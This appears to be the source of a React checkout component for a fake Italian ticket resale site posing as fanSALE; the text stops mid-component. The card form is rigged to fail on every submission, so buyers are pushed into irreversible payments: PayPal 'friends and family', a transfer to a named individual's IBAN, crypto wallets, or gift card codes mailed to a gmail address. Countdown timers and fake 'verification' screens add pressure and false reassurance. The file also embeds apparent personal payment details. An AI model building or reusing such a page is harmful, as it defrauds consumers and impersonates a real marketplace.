"use client";

import { useState } from "react";
import {
  Lock,
  ShieldCheck,
  CreditCard,
  AlertCircle,
  CheckCircle,
  Copy,
  ExternalLink,
  Clock,
  Building2,
  Bitcoin,
  Gift,
} from "lucide-react";
import { formatCurrency } from "@/utils/formatCurrency";
import { useCountdown } from "@/hooks/useCountdown";

// ─── Constants ────────────────────────────────────────────────────────────────

const PAYPAL_EMAIL = "schmid129@outlook.com";

const IBAN_DETAILS = {
  recipientName: "HAMMED ADEKUNLE ADEGOKE",
  iban: "MT16 CFTE 2800 4000 0000 0000 5946 162",
  swift: "CFTEMTM1XXX",
  bankName: "OPENPAYD FINANCIAL SERVICES MALTA LTD",
  currency: "EUR",
};

const CRYPTO_WALLETS = {
  btc: {
    label: "Bitcoin (BTC)",
    address: "bc1q0yhdjnas2d4zcdzn9euq24s32ffsxterrg6yn0",
    network: "Bitcoin Network",
    color: "#f7931a",
  },
  usdt: {
    label: "USDT (TRC-20)",
    address: "TKa2e8FukBqjRo7HtT6nytkphXESfEi9M9",
    network: "TRON Network (TRC-20)",
    color: "#26a17b",
  },
  eth: {
    label: "Ethereum (ETH)",
    address: "0x8cdF313F79e93aad0951C75eD84e658184B1959f",
    network: "Ethereum Network (ERC-20)",
    color: "#627eea",
  },
};

const GIFT_CARD_OPTIONS = [
  {
    id: "amazon",
    label: "Amazon Gift Card",
    emoji: "📦",
    color: "#ff9900",
    bgColor: "#fff8ee",
    borderColor: "#ffcc80",
    buyUrl: "https://www.amazon.it/gift-cards",
    denominations: [100, 50, 30, 25, 20, 15, 10],
    instructions:
      "Acquista una Amazon Gift Card del valore indicato, poi inserisci il codice qui sotto.",
  },
  {
    id: "steam",
    label: "Steam Gift Card",
    emoji: "🎮",
    color: "#1b2838",
    bgColor: "#f0f4ff",
    borderColor: "#a8c4f8",
    buyUrl: "https://store.steampowered.com/digitalgiftcards/",
    denominations: [100, 50, 25, 20, 15, 10, 5],
    instructions:
      "Acquista una Steam Gift Card del valore indicato, poi inserisci il codice qui sotto.",
  },
  {
    id: "google",
    label: "Google Play Gift Card",
    emoji: "▶️",
    color: "#4285f4",
    bgColor: "#f0f4ff",
    borderColor: "#a8c4f8",
    buyUrl: "https://play.google.com/intl/it/about/giftcards/",
    denominations: [50, 25, 15, 10, 5],
    instructions:
      "Acquista una Google Play Gift Card del valore indicato, poi inserisci il codice qui sotto.",
  },
  {
    id: "itunes",
    label: "Apple / iTunes Gift Card",
    emoji: "🍎",
    color: "#555555",
    bgColor: "#f5f5f5",
    borderColor: "#cccccc",
    buyUrl: "https://www.apple.com/it/shop/buy-giftcard/giftcard",
    denominations: [100, 50, 25, 15, 10, 5],
    instructions:
      "Acquista una Apple Gift Card del valore indicato, poi inserisci il codice qui sotto.",
  },
];

const SUPPORT_EMAIL = "pagamenti.fansale@gmail.com";

type PaymentMethod = "card" | "paypal" | "iban" | "crypto" | "giftcard";
type FlowState = "idle" | "generating" | "ready";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function formatCardNumber(value: string) {
  return value
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

// ─── Shared sub-components ────────────────────────────────────────────────────

function GeneratingSpinner({ label }: { label: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-12 gap-5">
      <div className="relative w-16 h-16">
        <div className="absolute inset-0 rounded-full border-4 border-gray-100" />
        <div className="absolute inset-0 rounded-full border-4 border-t-[#1a2744] border-r-transparent border-b-transparent border-l-transparent animate-spin" />
        <div
          className="absolute inset-2 rounded-full border-4 border-t-gray-400 border-r-transparent border-b-transparent border-l-transparent animate-spin"
          style={{ animationDirection: "reverse", animationDuration: "0.8s" }}
        />
      </div>
      <div className="text-center">
        <p className="font-bold text-gray-800 text-sm">{label}</p>
        <p className="text-xs text-gray-500 mt-1">
          Stiamo preparando i dettagli di pagamento sicuri
        </p>
      </div>
      <div className="flex gap-1.5">
        {[0, 1, 2, 3, 4].map((i) => (
          <div
            key={i}
            className="w-2 h-2 rounded-full bg-[#1a2744] animate-bounce"
            style={{ animationDelay: `${i * 0.15}s` }}
          />
        ))}
      </div>
    </div>
  );
}

function PaymentCountdown({ expiry }: { expiry: string }) {
  const { minutes, seconds, expired } = useCountdown(expiry);
  if (expired) {
    return (
      <div className="bg-red-50 border border-red-200 rounded-xl p-3 flex items-center gap-3">
        <Clock size={18} className="text-red-500 shrink-0" />
        <p className="text-sm font-semibold text-red-700">
          Il tempo per il pagamento è scaduto. Ricomincia dall&apos;inizio.
        </p>
      </div>
    );
  }
  return (
    <div className="bg-amber-50 border border-amber-300 rounded-xl p-3 flex items-center gap-3">
      <Clock size={18} className="text-amber-600 shrink-0" />
      <div>
        <p className="text-sm font-semibold text-amber-800">
          Completa il pagamento entro{" "}
          <strong className="text-orange-600">
            {minutes}:{String(seconds).padStart(2, "0")}
          </strong>
        </p>
        <p className="text-xs text-amber-600">
          Dopo questo tempo il tuo ordine verrà annullato.
        </p>
      </div>
    </div>
  );
}

function CopyField({ label, value }: { label: string; value: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <div>
      <p className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1">
        {label}
      </p>
      <div className="flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-lg px-3 py-2">
        <span className="font-mono text-sm text-gray-800 break-all">
          {value}
        </span>
        <button
          onClick={() => {
            navigator.clipboard.writeText(value).catch(() => {});
            setCopied(true);
            setTimeout(() => setCopied(false), 2500);
          }}
          className="flex items-center gap-1 text-xs font-semibold text-[#1a2744] hover:text-[#243560] shrink-0 ml-2"
        >
          {copied ? (
            <>
              <CheckCircle size={12} className="text-green-500" /> Copiato
            </>
          ) : (
            <>
              <Copy size={12} /> Copia
            </>
          )}
        </button>
      </div>
    </div>
  );
}

function ConfirmedScreen({ label }: { label: string }) {
  return (
    <div className="flex flex-col items-center justify-center py-12 gap-4">
      <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center">
        <CheckCircle size={36} className="text-green-500" />
      </div>
      <p className="font-bold text-gray-800 text-sm">{label}</p>
      <p className="text-xs text-gray-500">Reindirizzamento in corso...</p>
    </div>
  );
}

// ─── Card form ────────────────────────────────────────────────────────────────

function CardForm({ total, onBack }: { total: number; onBack: () => void }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [cardName, setCardName] = useState("");
  const [submitted, setSubmitted] = useState(false);

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        setSubmitted(true);
      }}
      className="space-y-4"
    >
      <div>
        <label className="block text-xs font-semibold text-gray-600 mb-1">
          Numero carta *
        </label>
        <div className="relative">
          <input
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
            placeholder="1234 5678 9012 3456"
            inputMode="numeric"
            className="w-full border border-gray-300 rounded-lg px-3 py-2.5 text-sm outline-none focus:border-[#1a2744] focus:ring-1 focus:ring-[#1a2744] font-mono pr-10"
          />
          <CreditCard
            size={16}
            className="absolute right-3 top-3 text-gray-400"
          />
        </div>
      </div>
      <div className="grid grid-cols-2 gap-4">
        <div>
          <label className="block text-xs font-semibold text-gray-600 mb-1">
            Scadenza *
          </label>
          <input
            value={expiry}
            onChange={(e) => setExpiry(formatExpiry(e.target.value))}
            placeholder="MM/AA"
            inputMode="numeric"
            maxLength={5}
            className="w-full border border-gray-300 rounded-lg px-3 py-2.5 text-sm outline-none focus:border-[#1a2744] focus:ring-1 focus:ring-[#1a2744] font-mono"
          />
        </div>
        <div>
          <label className="block text-xs font-semibold text-gray-600 mb-1">
            CVC *
          </label>
          <input
            value={cvc}
            onChange={(e) =>
              setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))
            }
            placeholder="123"
            inputMode="numeric"
            maxLength={4}
            className="w-full border border-gray-300 rounded-lg px-3 py-2.5 text-sm outline-none focus:border-[#1a2744] focus:ring-1 focus:ring-[#1a2744] font-mono"
          />
        </div>
      </div>
      <div>
        <label className="block text-xs font-semibold text-gray-600 mb-1">
          Nome sulla carta *
        </label>
        <input
          value={cardName}
          onChange={(e) => setCardName(e.target.value.toUpperCase())}
          placeholder="MARIO ROSSI"
          className="w-full border border-gray-300 rounded-lg px-3 py-2.5 text-sm outline-none focus:border-[#1a2744] focus:ring-1 focus:ring-[#1a2744] uppercase tracking-wide"
        />
      </div>
      {submitted && (
        <div className="flex items-start gap-3 bg-red-50 border border-red-300 rounded-xl p-4">
          <AlertCircle size={20} className="text-red-500 shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-bold text-red-700">
              Carta non abilitata per transazioni online
            </p>
            <p className="text-xs text-red-600 mt-1">
              La tua carta non è abilitata per i pagamenti online. Contatta la
              tua banca oppure utilizza <strong>PayPal</strong> o{" "}
              <strong>Bonifico Bancario</strong>.
            </p>
          </div>
        </div>
      )}
      <div className="flex gap-3 pt-1">
        <button
          type="button"
          onClick={onBack}
          className="flex-1 border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors"
        >
          ← Indietro
        </button>
        <button
          type="submit"
          className="flex-1 bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-black py-3 rounded-lg transition-colors flex items-center justify-center gap-2"
        >
          <Lock size={14} /> Paga {formatCurrency(total)}
        </button>
      </div>
    </form>
  );
}

// ─── PayPal Ready View ────────────────────────────────────────────────────────

function PayPalReadyView({
  total,
  buyerEmail,
  paymentExpiry,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  paymentExpiry: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const { expired } = useCountdown(paymentExpiry);
  const [copied, setCopied] = useState(false);
  const [stage, setStage] = useState<"idle" | "processing" | "confirmed">(
    "idle",
  );

  if (stage === "processing")
    return (
      <GeneratingSpinner label="Verifica del pagamento PayPal in corso..." />
    );
  if (stage === "confirmed")
    return <ConfirmedScreen label="Pagamento PayPal confermato!" />;

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3 bg-blue-50 border border-blue-200 rounded-xl p-4">
        <div className="w-10 h-10 rounded-full bg-[#003087] flex items-center justify-center shrink-0">
          <CheckCircle size={20} className="text-white" />
        </div>
        <div>
          <p className="font-bold text-[#003087] text-sm">
            Account PayPal pronto!
          </p>
          <p className="text-xs text-blue-600 mt-0.5">
            Invia il pagamento all&apos;indirizzo qui sotto
          </p>
        </div>
      </div>

      <PaymentCountdown expiry={paymentExpiry} />

      <div className="bg-gray-50 border-2 border-[#003087] rounded-xl p-4">
        <p className="text-xs font-semibold text-gray-500 mb-1 uppercase tracking-wide">
          Indirizzo PayPal destinatario
        </p>
        <div className="flex items-center justify-between gap-3">
          <span className="font-bold text-[#003087] text-base break-all">
            {PAYPAL_EMAIL}
          </span>
          <button
            onClick={() => {
              navigator.clipboard.writeText(PAYPAL_EMAIL).catch(() => {});
              setCopied(true);
              setTimeout(() => setCopied(false), 2500);
            }}
            className="flex items-center gap-1.5 bg-[#003087] hover:bg-[#002070] text-white text-xs font-semibold px-3 py-1.5 rounded-lg transition-colors shrink-0"
          >
            {copied ? (
              <>
                <CheckCircle size={12} /> Copiato!
              </>
            ) : (
              <>
                <Copy size={12} /> Copia
              </>
            )}
          </button>
        </div>
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 flex items-center justify-between">
        <span className="text-sm font-semibold text-gray-700">
          Importo da inviare:
        </span>
        <span className="text-xl font-black text-gray-900">
          {formatCurrency(total)}
        </span>
      </div>

      <div className="bg-white border border-gray-200 rounded-xl p-4">
        <p className="text-sm font-bold text-gray-800 mb-3">
          Come pagare con PayPal
        </p>
        <ol className="space-y-2 text-sm text-gray-700 list-decimal list-inside">
          <li>
            Apri l&apos;app <strong>PayPal</strong> o vai su{" "}
            <span className="text-[#003087] font-semibold">paypal.com</span> e
            accedi.
          </li>
          <li>
            Clicca su <strong>&quot;Invia&quot;</strong> o{" "}
            <strong>&quot;Invia denaro&quot;</strong>.
          </li>
          <li>
            Inserisci l&apos;indirizzo:{" "}
            <strong className="text-[#003087]">{PAYPAL_EMAIL}</strong>
          </li>
          <li>
            Inserisci l&apos;importo esatto:{" "}
            <strong>{formatCurrency(total)}</strong> (EUR).
          </li>
          <li>
            Nella nota scrivi la tua email:{" "}
            <strong>{buyerEmail || "la-tua@email.com"}</strong>
          </li>
          <li>
            Conferma. Riceverai i biglietti entro <strong>24 ore</strong>.
          </li>
        </ol>
      </div>

      <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-xs text-amber-800">
        ⚠️ <strong>Importante:</strong> Invia come{" "}
        <strong>&quot;Amici e familiari&quot;</strong> per evitare commissioni
        aggiuntive.
      </div>

      <a
        href="https://www.paypal.com/myaccount/transfer/homepage/pay"
        target="_blank"
        rel="noopener noreferrer"
        className="w-full flex items-center justify-center gap-2 bg-[#003087] hover:bg-[#002070] text-white font-bold py-3.5 rounded-xl transition-colors"
      >
        <ExternalLink size={16} /> Apri PayPal e paga ora
      </a>

      <button
        onClick={async () => {
          setStage("processing");
          await new Promise((r) => setTimeout(r, 30000));
          setStage("confirmed");
          setTimeout(() => onSuccess(), 1500);
        }}
        disabled={expired}
        className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-black py-4 rounded-xl transition-colors text-base"
      >
        <CheckCircle size={18} /> Ho effettuato il pagamento — Conferma
      </button>

      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Torna indietro
      </button>
    </div>
  );
}

// ─── PayPal flow ──────────────────────────────────────────────────────────────

function PayPalFlow({
  total,
  buyerEmail,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const [state, setState] = useState<FlowState>("idle");
  const [paymentExpiry, setPaymentExpiry] = useState<string | null>(null);

  const handleGenerate = async () => {
    setState("generating");
    await new Promise((r) => setTimeout(r, 10000));
    setPaymentExpiry(new Date(Date.now() + 20 * 60 * 1000).toISOString());
    setState("ready");
  };

  if (state === "generating")
    return <GeneratingSpinner label="Generazione account PayPal in corso..." />;
  if (state === "ready" && paymentExpiry) {
    return (
      <PayPalReadyView
        total={total}
        buyerEmail={buyerEmail}
        paymentExpiry={paymentExpiry}
        onBack={onBack}
        onSuccess={onSuccess}
      />
    );
  }

  return (
    <div className="space-y-4">
      <div className="bg-blue-50 border border-blue-200 rounded-xl p-5 text-center">
        <div className="flex items-center justify-center gap-1 mb-3">
          <span className="text-2xl font-black text-[#003087]">Pay</span>
          <span className="text-2xl font-black text-[#009cde]">Pal</span>
        </div>
        <p className="text-sm text-gray-600 mb-1">
          Paga in modo sicuro con il tuo account PayPal.
        </p>
        <p className="text-xs text-gray-400">
          Verrai guidato passo dopo passo nel processo di pagamento.
        </p>
      </div>
      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 flex items-center justify-between text-sm">
        <span className="text-gray-600">Totale da pagare:</span>
        <span className="font-black text-gray-900 text-lg">
          {formatCurrency(total)}
        </span>
      </div>
      <button
        onClick={handleGenerate}
        className="w-full bg-[#003087] hover:bg-[#002070] text-white font-black py-4 rounded-xl transition-colors flex items-center justify-center gap-2 text-base"
      >
        <Lock size={16} /> Paga {formatCurrency(total)} con PayPal
      </button>
      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Indietro
      </button>
    </div>
  );
}

// ─── IBAN Ready View ──────────────────────────────────────────────────────────

function IBANReadyView({
  total,
  buyerEmail,
  paymentExpiry,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  paymentExpiry: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const { expired } = useCountdown(paymentExpiry);
  const [stage, setStage] = useState<"idle" | "processing" | "confirmed">(
    "idle",
  );

  if (stage === "processing")
    return <GeneratingSpinner label="Verifica del bonifico in corso..." />;
  if (stage === "confirmed")
    return <ConfirmedScreen label="Bonifico confermato!" />;

  return (
    <div className="space-y-4">
      <div className="flex items-center gap-3 bg-green-50 border border-green-200 rounded-xl p-4">
        <div className="w-10 h-10 rounded-full bg-green-600 flex items-center justify-center shrink-0">
          <Building2 size={20} className="text-white" />
        </div>
        <div>
          <p className="font-bold text-green-800 text-sm">
            Dati bancari pronti!
          </p>
          <p className="text-xs text-green-600 mt-0.5">
            Esegui il bonifico con i dati qui sotto
          </p>
        </div>
      </div>

      <PaymentCountdown expiry={paymentExpiry} />

      <div className="bg-gray-50 border-2 border-green-600 rounded-xl p-4 space-y-3">
        <CopyField label="Intestatario" value={IBAN_DETAILS.recipientName} />
        <CopyField label="IBAN" value={IBAN_DETAILS.iban} />
        <CopyField label="SWIFT / BIC" value={IBAN_DETAILS.swift} />
        <CopyField label="Banca" value={IBAN_DETAILS.bankName} />
        <CopyField label="Valuta" value={IBAN_DETAILS.currency} />
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 flex items-center justify-between">
        <span className="text-sm font-semibold text-gray-700">
          Importo da inviare:
        </span>
        <span className="text-xl font-black text-gray-900">
          {formatCurrency(total)}
        </span>
      </div>

      <div className="bg-white border border-gray-200 rounded-xl p-4">
        <p className="text-sm font-bold text-gray-800 mb-3">
          Come eseguire il bonifico
        </p>
        <ol className="space-y-2 text-sm text-gray-700 list-decimal list-inside">
          <li>
            Accedi alla tua banca online o app bancaria e seleziona{" "}
            <strong>Bonifico bancario</strong>.
          </li>
          <li>
            Inserisci intestatario:{" "}
            <strong>{IBAN_DETAILS.recipientName}</strong> e IBAN:{" "}
            <strong className="font-mono">{IBAN_DETAILS.iban}</strong>.
          </li>
          <li>
            Per bonifici internazionali inserisci il codice SWIFT/BIC:{" "}
            <strong>{IBAN_DETAILS.swift}</strong>.
          </li>
          <li>
            Inserisci l&apos;importo esatto:{" "}
            <strong>{formatCurrency(total)}</strong> in EUR.
          </li>
          <li>
            Nella causale scrivi la tua email:{" "}
            <strong>{buyerEmail || "la-tua@email.com"}</strong>
          </li>
          <li>
            Conferma il bonifico. Riceverai i biglietti entro{" "}
            <strong>24 ore</strong> dalla ricezione del pagamento.
          </li>
        </ol>
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-xs text-blue-800">
        ℹ️ <strong>Nota:</strong> I bonifici SEPA vengono accreditati in{" "}
        <strong>1–2 giorni lavorativi</strong>. I biglietti verranno inviati
        dopo la conferma del pagamento.
      </div>

      <button
        onClick={async () => {
          setStage("processing");
          await new Promise((r) => setTimeout(r, 30000));
          setStage("confirmed");
          setTimeout(() => onSuccess(), 1500);
        }}
        disabled={expired}
        className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-black py-4 rounded-xl transition-colors text-base"
      >
        <CheckCircle size={18} /> Ho eseguito il bonifico — Conferma
      </button>

      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Torna indietro
      </button>
    </div>
  );
}

// ─── IBAN flow ────────────────────────────────────────────────────────────────

function IBANFlow({
  total,
  buyerEmail,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const [state, setState] = useState<FlowState>("idle");
  const [paymentExpiry, setPaymentExpiry] = useState<string | null>(null);

  const handleGenerate = async () => {
    setState("generating");
    await new Promise((r) => setTimeout(r, 10000));
    setPaymentExpiry(new Date(Date.now() + 20 * 60 * 1000).toISOString());
    setState("ready");
  };

  if (state === "generating")
    return <GeneratingSpinner label="Generazione dati bancari in corso..." />;
  if (state === "ready" && paymentExpiry) {
    return (
      <IBANReadyView
        total={total}
        buyerEmail={buyerEmail}
        paymentExpiry={paymentExpiry}
        onBack={onBack}
        onSuccess={onSuccess}
      />
    );
  }

  return (
    <div className="space-y-4">
      <div className="bg-green-50 border border-green-200 rounded-xl p-5 text-center">
        <div className="flex items-center justify-center gap-2 mb-3">
          <Building2 size={28} className="text-green-700" />
          <span className="text-xl font-black text-green-800">
            Bonifico Bancario
          </span>
        </div>
        <p className="text-sm text-gray-600 mb-1">
          Paga tramite bonifico bancario SEPA.
        </p>
        <p className="text-xs text-gray-400">
          Riceverai i dati bancari per completare il pagamento.
        </p>
      </div>
      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 flex items-center justify-between text-sm">
        <span className="text-gray-600">Totale da pagare:</span>
        <span className="font-black text-gray-900 text-lg">
          {formatCurrency(total)}
        </span>
      </div>
      <button
        onClick={handleGenerate}
        className="w-full bg-green-600 hover:bg-green-700 text-white font-black py-4 rounded-xl transition-colors flex items-center justify-center gap-2 text-base"
      >
        <Lock size={16} /> Ottieni dati bancari
      </button>
      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Indietro
      </button>
    </div>
  );
}

// ─── Crypto flow ──────────────────────────────────────────────────────────────

function CryptoFlow({
  total,
  buyerEmail,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const [selectedCoin, setSelectedCoin] =
    useState<keyof typeof CRYPTO_WALLETS>("btc");
  const [stage, setStage] = useState<"idle" | "processing" | "confirmed">(
    "idle",
  );
  const coin = CRYPTO_WALLETS[selectedCoin];

  if (stage === "processing")
    return (
      <GeneratingSpinner label="Verifica del pagamento crypto in corso..." />
    );
  if (stage === "confirmed")
    return <ConfirmedScreen label="Pagamento crypto confermato!" />;

  return (
    <div className="space-y-4">
      <div className="bg-gray-900 border border-gray-700 rounded-xl p-5 text-center">
        <div className="flex items-center justify-center gap-2 mb-2">
          <Bitcoin size={28} className="text-[#f7931a]" />
          <span className="text-xl font-black text-white">Criptovalute</span>
        </div>
        <p className="text-sm text-gray-400">
          Paga con Bitcoin, USDT o Ethereum in modo anonimo e sicuro.
        </p>
      </div>

      <div className="grid grid-cols-3 gap-2">
        {(
          Object.keys(CRYPTO_WALLETS) as Array<keyof typeof CRYPTO_WALLETS>
        ).map((key) => {
          const w = CRYPTO_WALLETS[key];
          return (
            <button
              key={key}
              onClick={() => setSelectedCoin(key)}
              className={`py-2.5 px-2 rounded-lg text-xs font-bold border transition-colors text-center ${
                selectedCoin === key
                  ? "text-white border-transparent"
                  : "bg-white text-gray-600 border-gray-300 hover:border-gray-400"
              }`}
              style={
                selectedCoin === key
                  ? { background: w.color, borderColor: w.color }
                  : {}
              }
            >
              {key === "btc" ? "₿ BTC" : key === "usdt" ? "₮ USDT" : "Ξ ETH"}
            </button>
          );
        })}
      </div>

      <div
        className="rounded-xl p-4 space-y-3 border-2"
        style={{ borderColor: coin.color, background: "#f9fafb" }}
      >
        <div className="flex items-center gap-2 mb-1">
          <span className="text-sm font-black" style={{ color: coin.color }}>
            {coin.label}
          </span>
          <span className="text-xs text-gray-500">— {coin.network}</span>
        </div>
        <CopyField label="Indirizzo wallet" value={coin.address} />
      </div>

      <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-4 flex items-center justify-between">
        <span className="text-sm font-semibold text-gray-700">
          Importo equivalente:
        </span>
        <span className="text-xl font-black text-gray-900">
          {formatCurrency(total)}
        </span>
      </div>

      <div className="bg-white border border-gray-200 rounded-xl p-4">
        <p className="text-sm font-bold text-gray-800 mb-3">
          Come pagare con {coin.label}
        </p>
        <ol className="space-y-2 text-sm text-gray-700 list-decimal list-inside">
          <li>
            Apri il tuo wallet crypto (es. Coinbase, Binance, Trust Wallet).
          </li>
          <li>
            Seleziona <strong>Invia</strong> e scegli la rete{" "}
            <strong>{coin.network}</strong>.
          </li>
          <li>
            Copia l&apos;indirizzo wallet sopra e incollalo come destinatario.
          </li>
          <li>
            Invia l&apos;equivalente di <strong>{formatCurrency(total)}</strong>{" "}
            in {coin.label}.
          </li>
          <li>
            Invia una email a{" "}
            <strong className="text-[#1a2744]">{SUPPORT_EMAIL}</strong> con
            l&apos;hash della transazione e la tua email:{" "}
            <strong>{buyerEmail || "la-tua@email.com"}</strong>.
          </li>
          <li>
            Riceverai i biglietti entro <strong>1–2 ore</strong> dalla conferma
            della transazione.
          </li>
        </ol>
      </div>

      <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-xs text-amber-800">
        ⚠️ <strong>Attenzione:</strong> Invia <strong>solo</strong> sulla rete{" "}
        <strong>{coin.network}</strong>. Invii su reti errate non sono
        recuperabili.
      </div>

      <a
        href={`mailto:${SUPPORT_EMAIL}?subject=Pagamento%20Crypto%20${encodeURIComponent(coin.label)}&body=Hash%20transazione%3A%20%0AEmail%3A%20${encodeURIComponent(buyerEmail || "")}`}
        className="w-full flex items-center justify-center gap-2 bg-gray-900 hover:bg-gray-800 text-white font-bold py-3.5 rounded-xl transition-colors"
      >
        <ExternalLink size={16} /> Invia conferma via email
      </a>

      <button
        onClick={async () => {
          setStage("processing");
          await new Promise((r) => setTimeout(r, 30000));
          setStage("confirmed");
          setTimeout(() => onSuccess(), 1500);
        }}
        className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 text-white font-black py-4 rounded-xl transition-colors text-base"
      >
        <CheckCircle size={18} /> Ho inviato il pagamento — Conferma
      </button>

      <button
        onClick={onBack}
        className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
      >
        ← Indietro
      </button>
    </div>
  );
}

// ─── Gift Card flow ───────────────────────────────────────────────────────────

// Round up to nearest €5
function roundUpToNearest5(amount: number): number {
  return Math.ceil(amount / 5) * 5;
}

// Split rounded amount into fewest cards using greedy algorithm
function splitIntoCards(
  roundedAmount: number,
  denominations: number[],
): number[] {
  const sorted = [...denominations].sort((a, b) => b - a); // largest first
  const cards: number[] = [];
  let remaining = roundedAmount;
  for (const denom of sorted) {
    while (remaining >= denom) {
      cards.push(denom);
      remaining -= denom;
    }
  }
  return cards;
}

function GiftCardFlow({
  total,
  buyerEmail,
  onBack,
  onSuccess,
}: {
  total: number;
  buyerEmail: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const [selectedCard, setSelectedCard] = useState<string>("amazon");
  const [stage, setStage] = useState<
    "idle" | "entering_codes" | "submitted" | "confirmed"
  >("idle");
  const [codes, setCodes] = useState<string[]>([]);

  const card = GIFT_CARD_OPTIONS.find((c) => c.id === selectedCard)!;
  const roundedTotal = roundUpToNearest5(total);
  const cardBreakdown = splitIntoCards(roundedTotal, card.denominations);

  // Reset codes when card type or breakdown changes
  const resetCodes = (breakdown: number[]) => {
    setCodes(breakdown.map(() => ""));
  };

  const handleCardSelect = (id: string) => {
    setSelectedCard(id);
    const newCard = GIFT_CARD_OPTIONS.find((c) => c.id === id)!;
    const newBreakdown = splitIntoCards(
      roundUpToNearest5(total),
      newCard.denominations,
    );
    resetCodes(newBreakdown);
    setStage("idle");
  };

  const handleProceedToEnterCodes = () => {
    resetCodes(cardBreakdown);
    setStage("entering_codes");
  };

  const handleSubmitCodes = () => {
    const codeLines = cardBreakdown
      .map(
        (amount, i) =>
          `Carta ${i + 1} (€${amount}): ${codes[i] || "(non inserito)"}`,
      )
      .join("\n");

    const subject = `Pagamento Gift Card ${card.label} - ${buyerEmail}`;
    const body = `Tipo di gift card: ${card.label}\nImporto totale: €${roundedTotal}\nEmail acquirente: ${buyerEmail}\n\nCodici:\n${codeLines}`;

    window.open(
      `mailto:${SUPPORT_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`,
      "_blank",
    );
    setStage("submitted");
  };

  if (stage === "confirmed") {
    return (
      <ConfirmedScreen label="Gift card confermata! Riceverai i biglietti entro 24 ore." />
    );
  }

  if (stage === "submitted") {
    return (
      <div className="space-y-4">
        <div className="flex flex-col items-center justify-center py-10 gap-4">
          <div className="w-16 h-16 rounded-full bg-amber-100 flex items-center justify-center">
            <Clock size={32} className="text-amber-500" />
          </div>
          <div className="text-center">
            <p className="font-bold text-gray-800">Codici inviati!</p>
            <p className="text-sm text-gray-500 mt-1">
              Stiamo verificando i tuoi codici gift card.
              <br />
              Riceverai i biglietti entro <strong>24 ore</strong>.
            </p>
          </div>
          <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 w-full text-sm text-amber-800">
            <p className="font-semibold mb-1">Riepilogo codici inviati:</p>
            {cardBreakdown.map((amount, i) => (
              <div
                key={i}
                className="flex justify-between py-1 border-b border-amber-100 last:border-0"
              >
                <span>
                  Carta {i + 1} — €{amount}
                </span>
                <span className="font-mono text-xs">{codes[i] || "—"}</span>
              </div>
            ))}
          </div>
        </div>
        <button
          onClick={() => {
            setStage("confirmed");
            setTimeout(() => onSuccess(), 1500);
          }}
          className="w-full flex items-center justify-center gap-2 bg-green-500 hover:bg-green-600 text-white font-black py-4 rounded-xl transition-colors"
        >
          <CheckCircle size={18} /> Conferma ordine
        </button>
        <button
          onClick={onBack}
          className="w-full border border-gray-300 text-gray-600 font-semibold py-3 rounded-lg hover:bg-gray-50 transition-colors text-sm"
        >
          ← Torna indietro
        </button>
      </div>
    );
  }

  if (stage === "entering_codes") {
    const allFilled = codes.every((c) => c.trim().length >= 4);
    return (
      <div className="space-y-4">
        <div
          className="flex items-center gap-3 p-4 rounded-xl border"
          style={{ background: card.bgColor, borderColor: card.borderColor }}
        >
